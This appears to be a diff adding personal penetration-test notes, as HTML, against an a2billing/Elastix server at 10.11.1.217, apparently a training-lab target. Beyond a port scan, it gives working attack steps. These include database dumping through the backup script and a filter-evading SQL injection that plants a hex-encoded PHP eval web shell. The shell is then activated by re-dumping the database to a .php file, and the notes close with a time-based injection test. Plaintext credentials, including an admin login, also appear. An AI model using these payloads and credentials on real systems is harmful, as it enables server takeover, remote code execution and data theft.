@@ -1,0 +1,171 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.217</title>
+</head><body>https://10.11.1.217/<br/>
+<br/>
+<br/>
+Localhost has a2billing.<br/>
+<br/>
+Password is: 19670517erika<br/>
+<br/>
+<br/>
+====<br/>
+Elastic<br/>
+====<br/>
+<br/>
+<br/>
+Login screen<br/>
+<br/>
+<br/>
+<br/>
+Services<br/>
+========<br/>
+<br/>
+host &nbsp; &nbsp; &nbsp; &nbsp; port &nbsp;proto &nbsp;name &nbsp; &nbsp; &nbsp;state &nbsp;info<br/>
+---- &nbsp; &nbsp; &nbsp; &nbsp; ---- &nbsp;----- &nbsp;---- &nbsp; &nbsp; &nbsp;----- &nbsp;----<br/>
+10.11.1.217 &nbsp;22 &nbsp; &nbsp;tcp &nbsp; &nbsp;ssh &nbsp; &nbsp; &nbsp; open &nbsp; OpenSSH 4.3 protocol 2.0<br/>
+10.11.1.217 &nbsp;25 &nbsp; &nbsp;tcp &nbsp; &nbsp;smtp &nbsp; &nbsp; &nbsp;open<br/>
+10.11.1.217 &nbsp;80 &nbsp; &nbsp;tcp &nbsp; &nbsp;http &nbsp; &nbsp; &nbsp;open &nbsp; Apache httpd 2.2.3<br/>
+10.11.1.217 &nbsp;110 &nbsp; tcp &nbsp; &nbsp;pop3 &nbsp; &nbsp; &nbsp;open<br/>
+10.11.1.217 &nbsp;111 &nbsp; tcp &nbsp; &nbsp;rpcbind &nbsp; open &nbsp; 2 RPC #100000<br/>
+10.11.1.217 &nbsp;143 &nbsp; tcp &nbsp; &nbsp;imap &nbsp; &nbsp; &nbsp;open<br/>
+10.11.1.217 &nbsp;443 &nbsp; tcp &nbsp; &nbsp;ssl/http &nbsp;open &nbsp; Apache httpd 2.2.3 (CentOS)<br/>
+10.11.1.217 &nbsp;993 &nbsp; tcp &nbsp; &nbsp;imaps &nbsp; &nbsp; open<br/>
+10.11.1.217 &nbsp;995 &nbsp; tcp &nbsp; &nbsp;pop3s &nbsp; &nbsp; open<br/>
+10.11.1.217 &nbsp;3306 &nbsp;tcp &nbsp; &nbsp;mysql &nbsp; &nbsp; open<br/>
+<br/>
+msf &gt; hosts -S 10.11.1.217<br/>
+<br/>
+Hosts<br/>
+=====<br/>
+<br/>
+address &nbsp; &nbsp; &nbsp;mac &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;name &nbsp;os_name &nbsp;os_flavor &nbsp;os_sp &nbsp;purpose &nbsp;info &nbsp;comments<br/>
+------- &nbsp; &nbsp; &nbsp;--- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---- &nbsp;------- &nbsp;--------- &nbsp;----- &nbsp;------- &nbsp;---- &nbsp;--------<br/>
+10.11.1.217 &nbsp;00:50:56:89:1c:31 &nbsp; &nbsp; &nbsp; &nbsp;Linux &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2.6.X &nbsp;server<br/>
+<br/>
+<br/>
+<br/>
+Vulnerabilites:<br/>
+=========<br/>
+<br/>
+https://0x4148.com/posts/a2billing-2.1.1-sqli/<br/>
+<br/>
+<br/>
+A2billing Backup File Download / Remote Code Execution Vulnerabilities <br/>
+https://127.0.0.1:9392/omp?cmd=get_result&amp;result_id=9b501981-296d-475b-8f8e-6b6df72bb678&amp;token=970e861d-3cb8-4b64-8068-9407d8c22fc6<br/>
+https://www.exploit-db.com/exploits/42616/<br/>
+<br/>
+<br/>
+https://10.11.1.217/a2billing/admin/Public/form_data/FG_var_backup.inc<br/>
+<br/>
+Dump the database<br/>
+--------------------------<br/>
+http://10.11.1.217/a2billing/admin/Public/A2B_entity_backup.php?form_action=add&amp;path=0x4148.sql<br/>
+<br/>
+<br/>
+View it:<br/>
+https://10.11.1.217/a2billing/admin/Public/0x4148.sql<br/>
+<br/>
+Insert our code into the database:<br/>
+--------------------------------------------<br/>
+<br/>
+POST https://10.11.1.217/a2billing/agent/Public/checkout_process.php HTTP/1.1<br/>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0<br/>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>
+Accept-Language: en-US,en;q=0.5<br/>
+Connection: keep-alive<br/>
+Upgrade-Insecure-Requests: 1<br/>
+Content-Length: 255<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Host: 10.11.1.217<br/>
+Cookie: UIADMINSESSION=jqoc4p6opd0lmanli9g39velv6; UIAGENTSESSION=gbbetmoere42q5jcqcqtaatp02; elastixSession=r626ltn5h7t29cqnpslnamqcv0<br/>
+<br/>
+<br/>
+transactionID=456789111111 unise//**lecton selinse//**rtect 1,2,3,4,0x706c75676e706179,0x3c3f706870206576616c286261736536345f6465636f646528245f504f53545b6e61696c69745d29293b203f3e,7,8,9,10,11,12,13-//**- -&amp;sess_id=4148&amp;key=98346a2b29c131c78dc89b50894176eb<br/>
+<br/>
+<br/>
+Dump the databse again with .php extension:<br/>
+----------------------------------------------------------<br/>
+<br/>
+http://10.11.1.217/a2billing/admin/Public/A2B_entity_backup.php?form_action=add&amp;path=0x4148-new.php<br/>
+<br/>
+<br/>
+Dump the database again.<br/>
+Look for table cc_payments_agent<br/>
+<br/>
+Post to admin/Public/0x4148-new.php with param nailit=&lt;base64 encoded php code&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+$log_file = "/var/www/html/a2billing/admin/Public/epayment.log";<br/>
+$log_fh = fopen($log_file, 'a') or die('Cannot open file: &nbsp;'.$log_file);<br/>
+fwrite($log_fh, 'transactionID:'.$transactionID.' sess_id:'.$sess_id."\n");<br/>
+<br/>
+<br/>
+<br/>
+Verification step will pass with this:<br/>
+transactionID=456789111111 unise//**lecton selinse//**rtect 1,2,3,4,0x706c75676e706179,6,7,8,9,10,11,12,13-//**- -&amp;sess_id=4148&amp;key=636902c6ed0db5780eb613d126e95268<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+transactionID=456789111111 unise//**lecton selinse//**rtect 1,2,3,4,0x706c75676e706179,0x3c3f706870206576616c286261736536345f6465636f646528245f504f53545b6e61696c69745d29293b203f3e,7,8,9,10,11,12,13-//**- -&amp;sess_id=4148&amp;key=98346a2b29c131c78dc89b50894176eb<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Testing the vulnerability:<br/>
+<br/>
+transactionID=456789 oWHEUPDATEREr 0x4148&gt;benchmark(1,md5(0x4148))-//**- -&amp;sess_id=111111<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+We can log in to admin with:<br/>
+root<br/>
+changepassword<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+POST https://10.11.1.217/a2billing/admin/Public/PP_intro.php HTTP/1.1<br/>
+Host: 10.11.1.217<br/>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0<br/>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>
+Accept-Language: en-US,en;q=0.5<br/>
+Referer: https://10.11.1.217/a2billing/admin/Public/index.php?error=1<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-Length: 89<br/>
+Cookie: ui_language=english; UIADMINSESSION=s8en0aa95rbomd11gm8g9h3ku5<br/>
+Connection: keep-alive<br/>
+Upgrade-Insecure-Requests: 1<br/>
+<br/>
+<br/>
+done=submit_log&amp;pr_login=root&amp;pr_password=changepassword&amp;ui_language=english&amp;submit=LOGIN<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
